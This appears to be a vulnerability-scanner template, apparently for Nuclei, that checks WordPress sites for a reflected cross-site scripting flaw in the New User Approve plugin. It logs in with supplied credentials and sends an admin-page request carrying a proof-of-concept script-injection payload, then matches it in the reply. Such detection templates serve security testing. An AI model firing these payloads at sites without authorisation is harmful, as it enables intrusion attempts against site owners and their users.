http:
- matchers:
  - part: body
    type: word
    words:
    - ?a"><script>alert(1)</script>&new-user-approve-settings
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1

    Host: {{Hostname}}

    '
id: new-user-approve-xss
info:
  author: Akincibor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: WordPress New User Approve 2.4.1 does not escape some URLs before outputting
    them back in attributes, leading to reflected cross-site scripting.
  metadata:
    max-request: 2
    verified: true
  name: WordPress New User Approve <2.4.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/17f99601-f5c9-4300-9b4a-6d75fa7ab94a
  - https://wordpress.org/plugins/new-user-approve
  severity: medium
  tags: wordpress,xss,authenticated,wp-plugin,wpscan,wp
